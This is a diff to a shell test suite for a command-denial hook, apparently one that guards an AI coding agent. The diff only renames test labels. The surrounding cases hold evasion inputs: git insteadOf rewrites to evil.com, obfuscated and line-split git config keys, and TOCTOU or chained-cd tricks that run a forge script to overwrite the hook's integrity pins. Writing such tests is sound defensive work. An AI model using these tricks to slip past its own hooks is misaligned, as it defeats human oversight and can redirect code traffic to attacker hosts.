@@ -132,12 +132,12 @@ assert_rc "worker round 10 codex-1 NUL via \\c@ ends the segment" 2 "$(run_case 
 assert_rc "worker round 10 codex-2 decoy + two adjacent split segments" 2 "$(run_case "$(j_bash "echo '$' ; g\$'\\x69'\$'\\x74' config url.x.insteadOf y")" "HIMMEL_WORKER=1")"
 assert_rc "worker round 10 plain backslash-t inside the key" 2 "$(run_case "$(j_bash "git config url.x.ins\\teadOf y")" "HIMMEL_WORKER=1")"
 assert_rc "worker round 10 plain backslash-r inside url" 2 "$(run_case "$(j_bash "git config remote.origin.u\\rl https://evil")" "HIMMEL_WORKER=1")"
-assert_rc "worker HIMMEL-4032 backslash-newline split insteadOf key" 2 "$(run_case "$(j_bash "$(printf 'command git config url.x.inste\\\nadOf Y')")" "HIMMEL_WORKER=1")"
+assert_rc "worker backslash-newline split insteadOf key" 2 "$(run_case "$(j_bash "$(printf 'command git config url.x.inste\\\nadOf Y')")" "HIMMEL_WORKER=1")"
 # The two rows below are denied by the anchor-tamper ANSI-C arm (`git` + a
 # dollar-quote in its args); pinned so a change to that arm is visible. The codex
 # fence and parity guard pin the ALLOW verdict.
-assert_rc "worker round 7 git commit -m ANSI-C denied by anchor arm" 2 "$(run_case "$(j_bash "git commit -m \$'l1\\nl2'")" "HIMMEL_WORKER=1")"
-assert_rc "worker round 7 git log --format=ANSI-C denied by anchor arm" 2 "$(run_case "$(j_bash "git log --format=\$'%h\\t%s'")" "HIMMEL_WORKER=1")"
+assert_rc "worker git commit -m ANSI-C denied by anchor arm" 2 "$(run_case "$(j_bash "git commit -m \$'l1\\nl2'")" "HIMMEL_WORKER=1")"
+assert_rc "worker git log --format=ANSI-C denied by anchor arm" 2 "$(run_case "$(j_bash "git log --format=\$'%h\\t%s'")" "HIMMEL_WORKER=1")"
 assert_rc "worker git -c quoted insteadOf one-shot fetch" 2 "$(run_case "$(j_bash "git -c 'url.https://evil.com/.insteadOf=https://github.com/' fetch")" "HIMMEL_WORKER=1")"
 assert_rc "worker config user.name allowed" 0 "$(run_case "$(j_bash 'git config user.name x')" "HIMMEL_WORKER=1")"
 assert_rc "worker remote -v allowed" 0 "$(run_case "$(j_bash 'git remote -v')" "HIMMEL_WORKER=1")"
@@ -320,7 +320,7 @@ printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_TOCTOU_FORGE"
 mkdir -p "$PIN_TOCTOU_DIR/real"
 PIN_TOCTOU_JSON=$(jq -n --arg cmd "rmdir real; cd real; bash forge.sh" --arg cwd "$PIN_TOCTOU_DIR" \
     '{tool_name:"Bash", tool_input:{command:$cmd, cwd:$cwd}}')
-assert_rc "pin-dir write denied via rmdir-then-cd TOCTOU on an existing target (pr-check)" 2 \
+assert_rc "pin-dir write denied via rmdir-then-cd TOCTOU on an existing target" 2 \
     "$(run_case "$PIN_TOCTOU_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
 # --- The candidate-set fork model
@@ -343,7 +343,7 @@ PIN_CHAIN_FORGE="$PIN_CHAIN_DIR/d5/d6/forge.sh"
 printf 'echo pwned > "%s/forged.json"\n' "$PIN_FIXTURE" > "$PIN_CHAIN_FORGE"
 PIN_CHAIN_JSON=$(jq -n --arg cmd "cd $PIN_CHAIN_DIR/d1; cd ../d2; cd ../d3; cd ../d4; cd ../d5; cd d6; bash forge.sh" \
     --arg cwd "$PIN_CHAIN_DIR" '{tool_name:"Bash", tool_input:{command:$cmd, cwd:$cwd}}')
-assert_rc "pin-dir write denied via 6 distinct cds overflowing MAXCAND (pr-check)" 2 \
+assert_rc "pin-dir write denied via 6 distinct cds overflowing MAXCAND" 2 \
     "$(run_case "$PIN_CHAIN_JSON" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 
 # --- `&&`/`||` short-circuit truthiness. The tokenizer segments
@@ -418,10 +418,10 @@ assert_rc "an even run of trailing backslashes is not a line continuation (contr
 # every token, rather than being patched per branch.
 PIN_CR=$(printf '\r')
 PIN_CRLF_CONT_CMD=$(printf 'bash %s/for\\%s\nge.sh' "$PIN_SCRIPT_DIR" "$PIN_CR")
-assert_rc "pin-dir write denied via a bash line continuation with CRLF endings (PR #2005 CodeRabbit)" 2 \
+assert_rc "pin-dir write denied via a bash line continuation with CRLF endings" 2 \
     "$(run_case "$(j_bash "$PIN_CRLF_CONT_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 PIN_PWSH_CRLF_CONT_CMD=$(printf 'bash %s/for%s%s\nge.sh' "$PIN_SCRIPT_DIR_NATIVE" "$PIN_BT" "$PIN_CR")
-assert_rc "pin-dir write denied via a PowerShell line continuation with CRLF endings (PR #2005 CodeRabbit)" 2 \
+assert_rc "pin-dir write denied via a PowerShell line continuation with CRLF endings" 2 \
     "$(run_case "$(j_pwsh "$PIN_PWSH_CRLF_CONT_CMD")" "HIMMEL_WORKER=1" "HIMMEL_HOOK_INTEGRITY_DIR=$PIN_FIXTURE")"
 # Negative control: the same CRLF continuation shape resolving to a BENIGN
 # script must stay rc=0, so the two cases above are the payload being caught
@@ -769,15 +769,15 @@ assert_rc "anchor-tamper codex-6: quoting composes with git -C <dir>" 2 \
 # class (ii)'s remote-argument match, never a class (i) keyword hit on the
 # refspec — see the double-quoted-dot-via-push row above, corrected to the
 # same refspec after it was found to pass even pre-fix for that reason.
-assert_rc "anchor-tamper HIMMEL-2528: bare .. remote" 2 \
+assert_rc "anchor-tamper: bare .. remote" 2 \
     "$(run_case "$(j_bash 'git fetch .. x:origin/main')" "HIMMEL_WORKER=1")"
-assert_rc "anchor-tamper HIMMEL-2528: double-quoted .. remote" 2 \
+assert_rc "anchor-tamper: double-quoted .. remote" 2 \
     "$(run_case "$(j_bash 'git fetch ".." x:origin/main')" "HIMMEL_WORKER=1")"
-assert_rc "anchor-tamper HIMMEL-2528: single-quoted .. remote" 2 \
+assert_rc "anchor-tamper: single-quoted .. remote" 2 \
     "$(run_case "$(j_bash "git fetch '..' x:origin/main")" "HIMMEL_WORKER=1")"
-assert_rc "anchor-tamper HIMMEL-2528: bare .. remote via git push" 2 \
+assert_rc "anchor-tamper: bare .. remote via git push" 2 \
     "$(run_case "$(j_bash 'git push .. x:origin/main')" "HIMMEL_WORKER=1")"
-assert_rc "anchor-tamper HIMMEL-2528: bare .. composes with git -C <dir>" 2 \
+assert_rc "anchor-tamper: bare .. composes with git -C <dir>" 2 \
     "$(run_case "$(j_bash 'git -C /some/dir fetch .. x:origin/main')" "HIMMEL_WORKER=1")"
 
 # The destination gate. Class (ii) used to match on the
@@ -899,7 +899,7 @@ assert_rc "anchor-tamper codex-6: commit message quoting a dot stays allowed" 0 
 # remote-argument position of a fetch/push/pull (here, plain prose in a commit
 # message) must not trip the new alternative — it only fires at the same
 # command-position slot the rest of class (ii) already anchors on.
-assert_rc "anchor-tamper HIMMEL-2528: commit message mentioning .. stays allowed" 0 \
+assert_rc "anchor-tamper: commit message mentioning .. stays allowed" 0 \
     "$(run_case "$(j_bash 'git commit -m "see ../notes for detail"')" "HIMMEL_WORKER=1")"
 
 # Negative controls. Inverting class (ii) from the remote
